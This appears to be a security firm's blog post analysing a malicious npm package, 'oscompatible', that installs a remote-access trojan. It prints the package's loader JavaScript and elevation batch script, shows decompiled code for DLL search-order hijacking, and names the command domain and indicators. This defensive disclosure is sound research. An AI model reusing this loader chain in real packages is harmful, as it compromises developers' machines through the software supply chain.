<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>npm Package Found Delivering Sophisticated RAT</title>

    <link rel="stylesheet" href="https://blog.phylum.io/assets/built/screen.css?v=cbdd2f08b7">

    <link rel="icon" href="https://blog.phylum.io/content/images/size/w256h256/2023/03/phylum-logo.png" type="image/png">
    <link rel="canonical" href="https://blog.phylum.io/npm-package-found-delivering-sophisticated-rat/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="Phylum Research | Software Supply Chain Security">
    <meta property="og:type" content="article">
    <meta property="og:title" content="npm Package Found Delivering Sophisticated RAT">
    <meta property="og:description" content="⚠️This appears to be an ongoing campaign. Since publication, additional packages have been released tied to this threat actor. See the IOCs below.

On January 12, 2024 Phylum’s automated risk detection platform alerted us to a suspicious publication on npm. The package in question, oscompatible, contained a few strange">
    <meta property="og:url" content="https://blog.phylum.io/npm-package-found-delivering-sophisticated-rat/">
    <meta property="og:image" content="https://blog.phylum.io/content/images/size/w1200/2024/01/spartan-cookie.png">
    <meta property="article:published_time" content="2024-01-19T03:02:39.000Z">
    <meta property="article:modified_time" content="2024-01-19T20:37:51.000Z">
    <meta property="article:tag" content="Research">
    
    <meta property="article:publisher" content="https://www.facebook.com/ghost">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="npm Package Found Delivering Sophisticated RAT">
    <meta name="twitter:description" content="⚠️This appears to be an ongoing campaign. Since publication, additional packages have been released tied to this threat actor. See the IOCs below.

On January 12, 2024 Phylum’s automated risk detection platform alerted us to a suspicious publication on npm. The package in question, oscompatible, contained a few strange">
    <meta name="twitter:url" content="https://blog.phylum.io/npm-package-found-delivering-sophisticated-rat/">
    <meta name="twitter:image" content="https://blog.phylum.io/content/images/size/w1200/2024/01/spartan-cookie.png">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Phylum Research Team">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Research">
    <meta name="twitter:site" content="@phylum_io">
    <meta name="twitter:creator" content="@Phylum_IO">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="686">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "Phylum Research | Software Supply Chain Security",
        "url": "https://blog.phylum.io/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://blog.phylum.io/content/images/2023/07/dark-bckg--1--svg.png"
        }
    },
    "author": {
        "@type": "Person",
        "name": "Phylum Research Team",
        "image": {
            "@type": "ImageObject",
            "url": "https://blog.phylum.io/content/images/2023/04/charles-darwin-phylum.webp",
            "width": 1024,
            "height": 1024
        },
        "url": "https://blog.phylum.io/author/phylum-research-team/",
        "sameAs": [
            "https://phylum.io",
            "https://twitter.com/Phylum_IO"
        ]
    },
    "headline": "npm Package Found Delivering Sophisticated RAT",
    "url": "https://blog.phylum.io/npm-package-found-delivering-sophisticated-rat/",
    "datePublished": "2024-01-19T03:02:39.000Z",
    "dateModified": "2024-01-19T20:37:51.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "https://blog.phylum.io/content/images/size/w1200/2024/01/spartan-cookie.png",
        "width": 1200,
        "height": 686
    },
    "keywords": "Research",
    "description": "⚠️This appears to be an ongoing campaign. Since publication, additional packages have been released tied to this threat actor. See the IOCs below.\n\nOn January 12, 2024 Phylum’s automated risk detection platform alerted us to a suspicious publication on npm. The package in question, oscompatible, contained a few strange binaries, including a single exe file, a single DLL file, and an encrypted dat file. The only JavaScript file present, index.js, simply executed a batch file that attempted to lau",
    "mainEntityOfPage": "https://blog.phylum.io/npm-package-found-delivering-sophisticated-rat/"
}
    </script>

    <meta name="generator" content="Ghost 5.97">
    <link rel="alternate" type="application/rss+xml" title="Phylum Research | Software Supply Chain Security" href="https://blog.phylum.io/rss/">
    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.44/umd/portal.min.js" data-i18n="false" data-ghost="https://blog.phylum.io/" data-key="53c8dc3d0bd9be3e71939ee508" data-api="https://phylum.ghost.io/ghost/api/content/" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
.gh-post-upgrade-cta {
    display: flex;
    flex-direction: column;
    align-items: center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    text-align: center;
    width: 100%;
    color: #ffffff;
    font-size: 16px;
}

.gh-post-upgrade-cta-content {
    border-radius: 8px;
    padding: 40px 4vw;
}

.gh-post-upgrade-cta h2 {
    color: #ffffff;
    font-size: 28px;
    letter-spacing: -0.2px;
    margin: 0;
    padding: 0;
}

.gh-post-upgrade-cta p {
    margin: 20px 0 0;
    padding: 0;
}

.gh-post-upgrade-cta small {
    font-size: 16px;
    letter-spacing: -0.2px;
}

.gh-post-upgrade-cta a {
    color: #ffffff;
    cursor: pointer;
    font-weight: 500;
    box-shadow: none;
    text-decoration: underline;
}

.gh-post-upgrade-cta a:hover {
    color: #ffffff;
    opacity: 0.8;
    box-shadow: none;
    text-decoration: underline;
}

.gh-post-upgrade-cta a.gh-btn {
    display: block;
    background: #ffffff;
    text-decoration: none;
    margin: 28px 0 0;
    padding: 8px 18px;
    border-radius: 4px;
    font-size: 16px;
    font-weight: 600;
}

.gh-post-upgrade-cta a.gh-btn:hover {
    opacity: 0.92;
}</style>
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.3/umd/sodo-search.min.js" data-key="53c8dc3d0bd9be3e71939ee508" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.3/umd/main.css" data-sodo-search="https://phylum.ghost.io/" data-locale="en" crossorigin="anonymous"></script>
    
    <link href="https://blog.phylum.io/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=cbdd2f08b7"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=cbdd2f08b7">
    <script defer src="/public/member-attribution.min.js?v=cbdd2f08b7"></script><style>:root {--ghost-accent-color: #061928;}</style>
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@700&display=swap" rel="stylesheet">

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@600&display=swap" rel="stylesheet">

<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-TXLWR5XJ');</script>
<!-- End Google Tag Manager -->
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-YSNX10QN1Q"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-YSNX10QN1Q');
</script>
</head>

<body class="post-template tag-research is-head-left-logo">
<div class="site">

    <header id="gh-head" class="gh-head gh-outer">
        <div class="gh-head-inner">
            <div class="gh-head-brand">
                <div class="gh-head-brand-wrapper">
                    <a class="gh-head-logo" href="https://phylum.io">
                            <img src="https://blog.phylum.io/content/images/2023/07/dark-bckg--1--svg.png" alt="Phylum Research | Software Supply Chain Security">
                    </a>
                </div>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="https://phylum.io">Home</a></li>
    <li class="nav-research"><a href="https://blog.phylum.io/tag/research/">Research</a></li>
    <li class="nav-insights-and-resources"><a href="https://blog.phylum.io/tag/insights/">Insights and Resources</a></li>
    <li class="nav-docs"><a href="https://docs.phylum.io/">Docs</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                    <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                    <a class="discord" href="https://discord.gg/Fe6pr5eW6p">Discord</a>
                    <a class="join-phylum" href="https://app.phylum.io">Sign Up Free</a>
            </div>
        </div>
    </header>


    <div class="site-content">
        
<div class="content-area">
<main class="site-main">


    <article class="post tag-research featured single-post">

        <header class="article-header gh-canvas">
            <div class="post-meta">
                <span class="post-meta-item post-meta-date">
                    <time datetime="2024-01-19">Jan 19, 2024</time>
                </span>
                    <span class="post-meta-item post-meta-length">6 min read</span>
                    <span class="post-meta-item post-meta-tags"><a class="post-tag post-tag-research" href="/tag/research/" title="Research">Research</a></span>
            </div>
            <h1 class="post-title">npm Package Found Delivering Sophisticated RAT</h1>
                <figure class="post-media kg-width-wide">
        <img
            class="post-image"
            srcset="/content/images/size/w400/2024/01/spartan-cookie.png 400w,
                    /content/images/size/w750/2024/01/spartan-cookie.png 750w,
                    /content/images/size/w960/2024/01/spartan-cookie.png 960w,
                    /content/images/size/w1140/2024/01/spartan-cookie.png 1140w,
                    /content/images/size/w1920/2024/01/spartan-cookie.png 1920w"
            sizes="(min-width: 960px) 960px, 92vw"
            src="/content/images/size/w960/2024/01/spartan-cookie.png"
            alt="npm Package Found Delivering Sophisticated RAT"
            loading="lazy"
        >

    </figure>

           	<style>
				.share-icons {
					display: flex;
					justify-content: center;
					align-items: center;
					height: 32px;
					margin: 2em 0 0 0; 
				}
				
				.share-icon {
					margin: 0 10px; /* Adjust spacing between icons */
					text-align: center;
				}

                .share-icon a img {
                    border-radius: 5px;
                }
			</style> 
            <div class="share-icons">
                <div class="share-icon">
                    <a href="https://news.ycombinator.com/submitlink?u=https://blog.phylum.io/npm-package-found-delivering-sophisticated-rat/&t=npm Package Found Delivering Sophisticated RAT" target="_blank">
                        <img src="https://blog.phylum.io/assets/images/hackernews.svg?v=cbdd2f08b7" alt="Hacker News" width="32" height="32">
                    </a>
                </div>
				
                <div class="share-icon">
                    <a href="https://www.reddit.com/submit?url=https://blog.phylum.io/npm-package-found-delivering-sophisticated-rat/&title=npm Package Found Delivering Sophisticated RAT" target="_blank">
                        <img src="https://blog.phylum.io/assets/images/reddit.svg?v=cbdd2f08b7" alt="Reddit" width="32" height="32">
                    </a>
                </div>
				
                <div class="share-icon">
                    <a href="https://twitter.com/intent/tweet?url=https://blog.phylum.io/npm-package-found-delivering-sophisticated-rat/&text=⚠️ npm Package Found Delivering Sophisticated RAT by @Phylum_IO">
                        <img src="https://blog.phylum.io/assets/images/twitter.svg?v=cbdd2f08b7" alt="Twitter" width="32" height="32">
                    </a>
                </div>
            </div>
        </header>

        <div class="gh-content gh-canvas">
            <div class="kg-card kg-callout-card kg-callout-card-blue"><div class="kg-callout-emoji">⚠️</div><div class="kg-callout-text">This appears to be an ongoing campaign. Since publication, additional packages have been released tied to this threat actor. See the <a href="https://blog.phylum.io/npm-package-found-delivering-sophisticated-rat/#iocs" rel="noreferrer">IOCs </a>below.</div></div><p>On January 12, 2024 Phylum’s automated risk detection platform alerted us to a suspicious publication on npm. The package in question, <code>oscompatible</code>, contained a few strange binaries, including a single exe file, a single DLL file, and an encrypted dat file. The only JavaScript file present, <code>index.js</code>, simply executed a batch file that attempted to launch the executable file. After reversing the executable we ultimately uncovered the deployment of RAT through a relatively complicated process that convincingly masqueraded as a standard Microsoft update process. Though the JavaScript side was relatively minimal and straightforward, the sophistication and deception employed in the binary is reminiscent of tactics recently observed in operations attributed to more sophisticated actors.</p><p>--cta--</p><h2 id="background">Background</h2><p>Contrary to a lot of the malware we find on npm, this one does <em>not</em> execute upon package installation. In this case, the <code>index.js</code> file just exports a function called <code>compat</code>. In order to actually trigger the execution chain, you’d need to run a script that <code>require</code>s the index file and then calls <code>compat()</code> from it—and you’d need to do it <em>without</em> admin privileges (more on that later). Alternatively, you could do the same interactively from the node REPL. That leaves some questions in terms of how the attacker intends to get the malware deployed onto machines. There is no README, but the package description from the <code>package.json</code> claims that this package can be used to "make project to be compatible with chromeOS”, whatever that means. Perhaps, they’re just attempting to fool casual users into integrating this package into their project? Maybe they’re giving explicit directions to use this package? Either way, this isn’t malware of the infect-on-install variety.</p><h2 id="the-attack-chain">The Attack Chain</h2><p>Let’s start by looking at the <code>index.js</code> file, the only actual JavaScript file in the package.</p><pre><code class="language-jsx">// index.js
const { spawn } = require('child_process');
const path = require('path');
const os = require("os");

module.exports = {
    compat: function() {
      if (os.platform() === "win32") {
        const binaryPath = path.join(__dirname, 'bin', 'autorun.bat');
        const child = spawn(binaryPath, []);
        child.stdout.on('data', (data) =&gt; {
          console.log(`stdout: ${data}`);
        });
        
        child.stderr.on('data', (data) =&gt; {
          if(data.toString().indexOf("start-process") != -1)
          {
            console.log( "\\x1b[31m%s\\x1b[0m", "Can't access Microsoft Edge rendering engine.");
            process.exit();
          }
        });
        
        child.on('close', (code) =&gt; {
        });
      } else if (os.platform() === "linux") {
        console.log(
          "\\x1b[31m%s\\x1b[0m",
          "This script is running on Linux. Please run on Windows Server OS."
        );
      } else {
        console.log(
          "\\x1b[31m%s\\x1b[0m",
          "This script is running on an unrecognized OS. Please run on Windows Server OS."
        );
      }
    }
  };
</code></pre><p>Here we can see that it first checks if the platform is Windows and if so is simply executes the <code>autorun.bat</code> file and if it doesn’t detect Windows, it tells the user it needs to be run specifically on “Windows Server OS”.</p><p>Let’s take a look in <code>autorun.bat</code>:</p><pre><code class="language-batch">@echo off

pushd %~dp0

:: echo %~dp0
:: Check for administrator privileges
&gt;nul 2&gt;&amp;1 "%SYSTEMROOT%\\system32\\cacls.exe" "%SYSTEMROOT%\\system32\\config\\system"

:: If the previous command returned with an error, ask for elevated permissions
if %errorlevel% neq 0 (
    :: echo Requesting administrative privileges...
    :: Prompt for UAC elevation
    powershell start-process ".\\app\\cookie_exporter.exe" -Verb RunAs
    exit /b
)

:: The rest of your script goes here with administrator privileges

popd
</code></pre><p>We can see here that the script first checks if it has admin privileges and if not, runs the <code>cookie_exporter.exe</code> and asks for privilege escalation before running. However, if the script was run and <em>already</em> had admin privileges, then nothing would happen.</p><p>This brings us to the <code>cookie_exporter.exe</code> file. <a href="https://www.virustotal.com/gui/file/846a9afe817380475fdd0209f41483cb09e4bf4bdb03ecafe8cb0cdf2004a57e?ref=blog.phylum.io"><code>cookie_exporter.exe</code></a> is a real component of Microsoft Edge being used here for its valid Authenticode signature. Attempting to run the process as administrator should display that Microsoft Edge wants to run as administrator in the UAC prompt. Here’s what that looks like.</p><figure class="kg-card kg-image-card"><img src="https://blog.phylum.io/content/images/2024/01/cookie_exporter_details.webp" class="kg-image" alt="" loading="lazy" width="1168" height="1244" srcset="https://blog.phylum.io/content/images/size/w600/2024/01/cookie_exporter_details.webp 600w, https://blog.phylum.io/content/images/size/w1000/2024/01/cookie_exporter_details.webp 1000w, https://blog.phylum.io/content/images/2024/01/cookie_exporter_details.webp 1168w" sizes="(min-width: 720px) 720px"></figure><p>We’ve all seen messages like this a hundred times. Clicking “Yes” will run <code>cookie_exporter.exe</code> with admin privileges. And this is where the attacker uses a clever tactic called “<a href="https://attack.mitre.org/techniques/T1574/001/?ref=blog.phylum.io">DLL search order hijacking</a>”. If we remember from earlier, we also have a file called <code>msedge.dll</code> in the same directory that shipped with this exe in the npm package. If we look in the decompiled exe code we can find this:</p><pre><code class="language-c">DWORD StartCookieExport(void)

{
  HMODULE hModule;
  FARPROC pFVar1;
  DWORD DVar2;
  code *UNRECOVERED_JUMPTABLE;
  
  hModule = LoadLibraryExA("msedge.dll",(HANDLE)0x0,0x1000);
  if (hModule == (HMODULE)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00401035. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    DVar2 = GetLastError();
    return DVar2;
  }
  pFVar1 = GetProcAddress(hModule,"ExportSpartanCookies");
  if (pFVar1 != (FARPROC)0x0) {
    _guard_check_icall();
                    /* WARNING: Could not recover jumptable at 0x00401032. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    DVar2 = (*UNRECOVERED_JUMPTABLE)();
    return DVar2;
  }
  return 0x80004001;
}
</code></pre><p>The pertinent part here is that the executable is using <a href="https://learn.microsoft.com/en-us/windows/win32/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa?ref=blog.phylum.io" rel="noreferrer"><code>LoadLibraryExA</code></a> to load a DLL called “msedge.dll”. Specifically:</p><pre><code class="language-c">hModule = LoadLibraryExA("msedge.dll",(HANDLE)0x0,0x1000);
</code></pre><p>According to the MSDN docs for this function, the directories searched and the order in which they are searched depends on the path and the <code>dwFlags</code> parameter (the third argument supplied). Here we can see it’s set to <code>0x1000</code>. Looking in the docs, this boils down to the fact that it will first look for this DLL in the application directory—the directory in which the executable is located. In other words, it’ll grab the attacker supplied <code>msedge.dll</code> in the same directory.</p><p>It turns out that <code>msedge.dll</code> is also a real component of Microsoft Edge, however, the <a href="https://www.virustotal.com/gui/file/e69af3efd71023e862d9b055508f04a493efe274a3bbdc8ef9263626e272590b?ref=blog.phylum.io" rel="noreferrer"><code>msedge.dll</code></a> that ships with this package is not the real <code>msedge.dll</code>. It was signed 2023 NOV 06 using a certificate that was revoked 2023 MAR 09. We’ve reached out to the company that we believe the signing keys originated from, but have not yet received a response. It remains unclear if these keys are the result of a broader compromise. It’s worth noting that this DLL also references the PDB file <code>D:\\Workstation\\Brazil_Itau\\itau-scammer\\Ihor\\17.SmartLoader\\virusloader\\Release\\msedge.pdb</code>.</p><p>Once the <code>msedge.dll</code> is loaded it calls a function named <code>ExportSpartanCookies</code>. The <code>ExportSpartanCookies</code> export does <em>not</em> export Edge cookies. Instead, it opens the encrypted and attacker-supplied <code>msedge.dat</code> file, decrypts it using a 352 byte XOR key to produce another DLL called <code>msedgedat.dll</code>, and then executes that. It’s worth noting that it appears this DLL is loaded into memory and runs it from there without writing to disk first.</p><p><a href="https://www.virustotal.com/gui/file/631f221da41e5f837a2b0fd44d07ae64640114b803d462688ada3efb88c98403?ref=blog.phylum.io"><code>msedgedat.dll</code></a> makes some requests to a domain called kdark1[.]com and downloads a zip file dated 2024 JAN 13 (13012024, DDMMYYYY). There is some code in there that seems to be for detecting if the file needs to be updated, indicating that this might be part of an on-going operation.</p><p>The <a href="https://www.virustotal.com/gui/file/15d0696d8fd165f55f0e8a9b30eb302f9554323c02b0cea87e3c3c93a05a3363?ref=blog.phylum.io">zip file</a> it pulls contains:</p><ul><li><a href="https://www.virustotal.com/gui/file/68a1426386d31f31d419e24cd398889f91c39f6078764aa90b596a14da3a598e?ref=blog.phylum.io"><code>ud.exe</code></a>: a program that takes over the screen and displays a fake Windows 10 updating animation (copied from <a href="https://updatefaker.com/?ref=blog.phylum.io">updatefaker.com</a>, contained in <a href="https://www.virustotal.com/gui/file/9d29e13d91650b6fa0d7972f7029531c81dd61867983d9fdf528ecccad6eab50?ref=blog.phylum.io"><code>resources.neu</code></a>). This is <a href="https://neutralino.js.org/?ref=blog.phylum.io">Neutralinojs</a>, an alternative to Electron, but it has been signed using the same revoked code signing certificate as <code>msedge.dll</code>.</li><li><a href="<https://www.virustotal.com/gui/file/109b03ffc45231e5a4c8805a10926492890f7b568f8a93abe1fa495b4bd42975>"><code>AnyDesk.exe</code></a>: a copy of <a href="https://anydesk.com/?ref=blog.phylum.io">AnyDesk</a>.</li><li><a href="<https://www.virustotal.com/gui/file/9730c3671d0ba7d7a749adb002891668abf32307a5bacab3b3779759fe14bbf5>"><code>Band64.dll</code></a>: this DLL gets injected into Explorer so the desktop can be hidden using <code>SetWindowBand</code>.</li><li><a href="<https://www.virustotal.com/gui/file/6859c58ba5cf72a231e0b1893653b341da02e05ef4e8522991e527a25bdcdfbc>"><code>RpcTest64.dll</code></a>: this DLL gets injected into winlogon.</li><li><a href="<https://www.virustotal.com/gui/file/6fd4699fe4be29009215868b07ccd15f730d43e69fd463c5cb949ec7a0b6efa9>"><code>verify</code></a>: a DLL encrypted using the same mechanism as <code>msedge.dat</code>.</li></ul><p>The decrypted <a href="https://www.virustotal.com/gui/file/5793169976cf7555dacd33f3aea5e22af08a10ccd4ef40700e6634a28bda587f?ref=blog.phylum.io"><code>verify.dll</code></a> is a RAT. Upon deployment, it does the following:</p><ul><li>Registers as a scheduled task.</li><li>Receives commands from a remote server using web sockets.</li><li>Installs Chrome extensions to Secure Preferences.</li><li>Configures AnyDesk, hides the screen, and disables shutting down Windows.</li><li>Captures keyboard and mouse events.</li><li>Collects information about files, browser extensions, and browser history.</li></ul><h2 id="conclusion">Conclusion</h2><p>As of publication <code>oscompatible</code> appears to be the only package on npm belonging to this campaign. Triggering the attack from the node side does require a bit of manual work and we’re currently unsure what the attacker’s intentions are in that regard. From the binary side, the process of decrypting data, using a revoked certificate for signing, pulling other files from remote sources, and attempting to disguise itself as a standard Windows update process all along the way is relatively sophisticated compared to what we normally see in OSS ecosystems. This is purely speculation at this point, but it’s possible that this execution chain may typically be triggered from other means, e.g. spearphising or something of that nature, and the attacker is attempting to repurpose it for deployment from a node process instead. Regardless, it serves as another reminder of how valuable of a target the open source ecosystems are for attackers.</p><p></p>
<!--kg-card-begin: html-->
<h2 id="iocs">IOCs</h2>
<!--kg-card-end: html-->
<table>
<thead>
<tr>
<th>Name</th>
<th>Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>edgecompatible</td>
<td>2.3.4</td>
</tr>
<tr>
<td>oscompatible</td>
<td>2.3.4</td>
</tr>
<tr>
<td>oscompatible</td>
<td>2.3.3</td>
</tr>
<tr>
<td>oscompatible</td>
<td>2.3.2</td>
</tr>
</tbody>
</table>
<ul><li><code>3712af5f9bfbcdbc4fdd6e2831425b39b0eb3aab1c6d61c004fe96d3a57f21f5</code></li><li><code>d2952e57023848a37fb0f21f0dfb38c9000f610ac2b00c2f128511dfd68bde04</code></li><li><code>kdark1[.]com</code></li><li><code>172.64.149.23</code></li></ul>
        </div>

            <div class="gh-canvas">

    <section class="author">

        <div class="author-image-placeholder u-placeholder">
                <img class="author-image u-object-fit" src="/content/images/size/w150/2023/04/charles-darwin-phylum.webp" alt="Phylum Research Team" loading="lazy">
        </div>

        <div class="author-wrapper">
            <h4 class="author-name"><a href="/author/phylum-research-team/">Phylum Research Team</a></h4>
                <div class="author-bio">Hackers, Data Scientists, and Engineers responsible for the identification and takedown of software supply chain attackers.</div>
        </div>

    </section>

</div>
    </article>


    <style>
    .gradient-text {
        background-image: linear-gradient(to right, #0099ff, #00feff, #0099ff);
        color: transparent;
        -webkit-background-clip: text; /* For Webkit browsers (e.g., Chrome, Safari) */
        background-clip: text;
    }
</style>
<div class="subscription-form" style="margin: 0">
    <div class="gh-canvas">
        <h2 class="gradient-text">Subscribe to our research</h2>
        <p>Keep up with the latest software supply chain attacks</p>
        <div style="min-height: 58px;max-width: 440px;margin: 0 auto;width: 100%"><script src="https://cdn.jsdelivr.net/ghost/signup-form@~0.1/umd/signup-form.min.js" data-button-color="#061928" data-button-text-color="#FFFFFF" data-site="https://blog.phylum.io" async></script></div>
    </div>
</div>

        
<section class="related-posts gh-canvas">

    <h3 class="related-title">You might also like...</h3>

    <div class="related-feed">

        <article class="post tag-research">

            <figure class="post-media">
                <div class="u-placeholder rectangle">
                    <a class="post-image-link" href="/trojanized-ethers-forks-on-npm-attempting-to-steal-ethereum-private-keys/">
                        <img class="post-image u-object-fit" src="/content/images/size/w750/2024/10/ethereum_thief.webp" alt="Trojanized Ethers Forks on npm Attempting to Steal Ethereum Private Keys" loading="lazy">
                    </a>
                </div>
            </figure>

            <header class="post-header">
                <h2 class="post-title">
                    <a class="post-title-link" href="/trojanized-ethers-forks-on-npm-attempting-to-steal-ethereum-private-keys/">Trojanized Ethers Forks on npm Attempting to Steal Ethereum Private Keys</a>
                </h2>
                <time class="post-meta" datetime="2024-10-18">Oct 18, 2024</time>
            </header>

        </article>


        <article class="post tag-research featured">

            <figure class="post-media">
                <div class="u-placeholder rectangle">
                    <a class="post-image-link" href="/north-korea-still-attacking-developers-via-npm/">
                        <img class="post-image u-object-fit" src="/content/images/size/w750/2024/08/u7986129932_A_rotund_north_korean_leader_in_a_dimly_lit_room__60671371-a6de-4712-8e17-b19f2847525b_3.png" alt="North Korea Still Attacking Developers via npm" loading="lazy">
                    </a>
                </div>
            </figure>

            <header class="post-header">
                <h2 class="post-title">
                    <a class="post-title-link" href="/north-korea-still-attacking-developers-via-npm/">North Korea Still Attacking Developers via npm</a>
                </h2>
                <time class="post-meta" datetime="2024-08-29">Aug 29, 2024</time>
            </header>

        </article>


        <article class="post tag-research">

            <figure class="post-media">
                <div class="u-placeholder rectangle">
                    <a class="post-image-link" href="/the-great-npm-garbage-patch/">
                        <img class="post-image u-object-fit" src="/content/images/size/w750/2024/08/garbage_patch.webp" alt="The Great npm Garbage Patch" loading="lazy">
                    </a>
                </div>
            </figure>

            <header class="post-header">
                <h2 class="post-title">
                    <a class="post-title-link" href="/the-great-npm-garbage-patch/">The Great npm Garbage Patch</a>
                </h2>
                <time class="post-meta" datetime="2024-08-06">Aug 6, 2024</time>
            </header>

        </article>

    </div>

</section>


</main>
</div>

    </div>


    <footer class="gh-foot gh-outer">
        <div class="gh-foot-inner gh-inner">
            <div class="gh-copyright">
                Phylum Research | Software Supply Chain Security © 2024
            </div>
            <nav class="gh-foot-menu">
                <ul class="nav">
    <li class="nav-sign-up"><a href="#/portal/">Sign up</a></li>
</ul>

            </nav>
            <div class="gh-powered-by">
            </div>
        </div>
    </footer>

</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="https://blog.phylum.io/assets/built/main.min.js?v=cbdd2f08b7"></script>

<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TXLWR5XJ"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

<script id="warmly-script-loader" src="https://opps-widget.getwarmly.com/warmly.js?clientId=9b43a4775c83f69b73a7f87c5d96fdd8" defer></script>

<style>
  .kg-width-wide .kg-header-card-text {    padding: 2em;
    font-size: .75em;
  }
</style>

<style>
table {
    border: 1px solid;
    padding: 0.5em;
    border-radius: 3px;
}
    
thead {
    border: 1px solid #333;
    background: #333;
    color: #fff;
}
    
tr {
    line-height: 2em;
    text-align: center;
}
    
/* CTA */
.cta {
  display: flex;
  flex-wrap: wrap;
  background: rgb(57,75,119);
  background: linear-gradient(90deg, rgba(57,75,119,1) 0%, rgba(35,48,79,1) 100%);
  border-radius: 5px;
  padding: 0.65em;
  color: #ffffff;
  font-size: 0.9em;
}

.item {
  flex: 1 0 100%;
  text-align: center;
}

.right {
    position: relative;
    margin: 2em 0em 2em 0em;
}

@media (min-width: 720px) {
  .cta {
    flex-direction: row;
  }

  .item {
	text-align: center;
  }

  .left {
    flex: 1 0;
  }

  .right {
    flex: 1 0;
    margin: 0;
  }
    
  #gh-cta-btn {
  	margin: 0 0.5em 0 0.5em;
  }
}

/* Typewriter */
.typewriter-container {
  display: inline-block;
  padding: 1em;
}

.typed-out {
  opacity: 100;
  overflow: hidden;
  margin: 0 auto;
  letter-spacing: .1em;
  animation: none;
  font-weight: bold;
}

/* The typing effect */
@keyframes typing {
	from { width: 0 }
	to { width: 100% }
}

/* The typewriter cursor effect */
@keyframes blink-caret {
	from, to { border-color: transparent }
	50% { border-color: lime; }
}

@media (min-width: 720px) {
	.typed-out {
		white-space: nowrap;
		border-right: 0.6em solid lime;
		animation:
			typing 3s steps(40, end),
			blink-caret .75s step-end infinite;
	}
}

#gh-cta-btn {
    padding: 0.5em;
    border-radius: 10px;
    color: #04371c !important;
    text-decoration: none;
    border: 0px;
    cursor: pointer;
    background: rgb(0,255,120);
